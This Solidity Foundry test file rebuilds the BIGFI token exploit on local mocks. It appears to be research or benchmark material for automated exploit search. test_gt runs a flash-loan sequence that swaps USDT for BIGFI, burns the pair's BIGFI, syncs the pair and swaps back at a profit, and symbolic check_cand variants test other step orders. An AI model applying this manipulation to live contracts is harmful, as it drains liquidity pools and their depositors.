// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./BIGFI.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract BIGFITest is Test, BlockLoader {
    BIGFI bigfi;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    address attacker;
    address constant owner = address(0x123456);
    uint256 blockTimestamp = 1679488640;
    uint112 reserve0pair = 107480664198219600542112;
    uint112 reserve1pair = 9310990259680030849404;
    uint32 blockTimestampLastpair = 1679487323;
    uint256 kLastpair = 1000000000000000000000000000000000000000000000;
    uint256 price0CumulativeLastpair = 9331442367350366394946020654225776954;
    uint256 price1CumulativeLastpair = 1315530319223280483996667964146207787633;
    uint256 totalSupplybigfi = 20999968897118620381698369;
    uint256 balanceOfbigfipair = 9310990259680030849404;
    uint256 balanceOfbigfiattacker = 0;
    uint256 totalSupplyusdt = 3179997916256874581285982200;
    uint256 balanceOfusdtpair = 107480664198219600542112;
    uint256 balanceOfusdtattacker = 0;

    function setUp() public {
        vm.warp(blockTimestamp);
        attacker = address(this);
        vm.startPrank(owner);
        bigfi = new BIGFI(
            owner,
            "Big finance",
            "BIGFI",
            18,
            10000e18,
            [1, 1, 1],
            [uint256(4), uint256(4), uint256(4), uint256(50)],
            0x602546D439EA254f3372c3985840750C6B9c6dDB
        );
        usdt = new USDT();
        pair = new UniswapV2Pair(
            address(usdt),
            address(bigfi),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        router = new UniswapV2Router(address(factory), address(0xdead));
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        bigfi.transfer(address(pair), balanceOfbigfipair);
        usdt.approve(attacker, UINT256_MAX);
        bigfi.approve(attacker, UINT256_MAX);
        vm.stopPrank();
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(bigfi),
            address(pair),
            bigfi.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(address(usdt), attacker, usdt.decimals());
        queryERC20BalanceDecimals(address(bigfi), attacker, bigfi.decimals());
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_usdt(uint256 amount) internal {
        usdt.transferFrom(owner, attacker, amount);
    }

    function payback_usdt(uint256 amount) internal {
        usdt.transfer(owner, amount);
    }

    function borrow_bigfi(uint256 amount) internal {
        bigfi.transferFrom(owner, attacker, amount);
    }

    function payback_bigfi(uint256 amount) internal {
        bigfi.transfer(owner, amount);
    }

    function swap_pair_usdt_bigfi(uint256 amount) internal {
        usdt.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(bigfi);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_bigfi_usdt(uint256 amount) internal {
        bigfi.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(bigfi);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function burn_pair_bigfi(uint256 amount) internal {
        bigfi.burn(address(pair), amount);
    }

    function test_gt() public {
        borrow_usdt(200000e18);
        printBalance("After step0 ");
        swap_pair_usdt_bigfi(usdt.balanceOf(attacker));
        printBalance("After step1 ");
        burn_pair_bigfi(3260e18);
        printBalance("After step2 ");
        sync_pair();
        printBalance("After step3 ");
        swap_pair_bigfi_usdt(bigfi.balanceOf(attacker));
        printBalance("After step4 ");
        payback_usdt(200600e18);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        sync_pair();
        swap_pair_bigfi_usdt(amt3);
        payback_usdt(amt4);
        assert(!attackGoal());
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        swap_pair_bigfi_usdt(amt3);
        payback_usdt(amt4);
        assert(!attackGoal());
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        swap_pair_bigfi_usdt(amt3);
        swap_pair_bigfi_usdt(amt4);
        payback_usdt(amt5);
        assert(!attackGoal());
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        sync_pair();
        swap_pair_bigfi_usdt(amt3);
        payback_usdt(amt4);
        assert(!attackGoal());
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        burn_pair_bigfi(amt3);
        swap_pair_bigfi_usdt(amt4);
        payback_usdt(amt5);
        assert(!attackGoal());
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        sync_pair();
        swap_pair_bigfi_usdt(amt3);
        swap_pair_bigfi_usdt(amt4);
        payback_usdt(amt5);
        assert(!attackGoal());
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt6 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        burn_pair_bigfi(amt3);
        swap_pair_bigfi_usdt(amt4);
        swap_pair_bigfi_usdt(amt5);
        payback_usdt(amt6);
        assert(!attackGoal());
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        burn_pair_bigfi(amt3);
        sync_pair();
        swap_pair_bigfi_usdt(amt4);
        payback_usdt(amt5);
        assert(!attackGoal());
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt6 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        burn_pair_bigfi(amt3);
        burn_pair_bigfi(amt4);
        swap_pair_bigfi_usdt(amt5);
        payback_usdt(amt6);
        assert(!attackGoal());
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt6 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        burn_pair_bigfi(amt3);
        sync_pair();
        swap_pair_bigfi_usdt(amt4);
        swap_pair_bigfi_usdt(amt5);
        payback_usdt(amt6);
        assert(!attackGoal());
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.assume(amt7 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        burn_pair_bigfi(amt3);
        burn_pair_bigfi(amt4);
        swap_pair_bigfi_usdt(amt5);
        swap_pair_bigfi_usdt(amt6);
        payback_usdt(amt7);
        assert(!attackGoal());
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt6 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        burn_pair_bigfi(amt3);
        burn_pair_bigfi(amt4);
        sync_pair();
        swap_pair_bigfi_usdt(amt5);
        payback_usdt(amt6);
        assert(!attackGoal());
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.assume(amt7 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        burn_pair_bigfi(amt3);
        burn_pair_bigfi(amt4);
        burn_pair_bigfi(amt5);
        swap_pair_bigfi_usdt(amt6);
        payback_usdt(amt7);
        assert(!attackGoal());
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.assume(amt7 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        burn_pair_bigfi(amt3);
        burn_pair_bigfi(amt4);
        sync_pair();
        swap_pair_bigfi_usdt(amt5);
        swap_pair_bigfi_usdt(amt6);
        payback_usdt(amt7);
        assert(!attackGoal());
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.assume(amt8 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        burn_pair_bigfi(amt3);
        burn_pair_bigfi(amt4);
        burn_pair_bigfi(amt5);
        swap_pair_bigfi_usdt(amt6);
        swap_pair_bigfi_usdt(amt7);
        payback_usdt(amt8);
        assert(!attackGoal());
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.assume(amt7 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        burn_pair_bigfi(amt3);
        burn_pair_bigfi(amt4);
        burn_pair_bigfi(amt5);
        sync_pair();
        swap_pair_bigfi_usdt(amt6);
        payback_usdt(amt7);
        assert(!attackGoal());
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.assume(amt8 == amt0 + 600000000000000012490);
        borrow_usdt(amt0);
        swap_pair_usdt_bigfi(amt1);
        burn_pair_bigfi(amt2);
        burn_pair_bigfi(amt3);
        burn_pair_bigfi(amt4);
        burn_pair_bigfi(amt5);
        sync_pair();
        swap_pair_bigfi_usdt(amt6);
        swap_pair_bigfi_usdt(amt7);
        payback_usdt(amt8);
        assert(!attackGoal());
    }
}
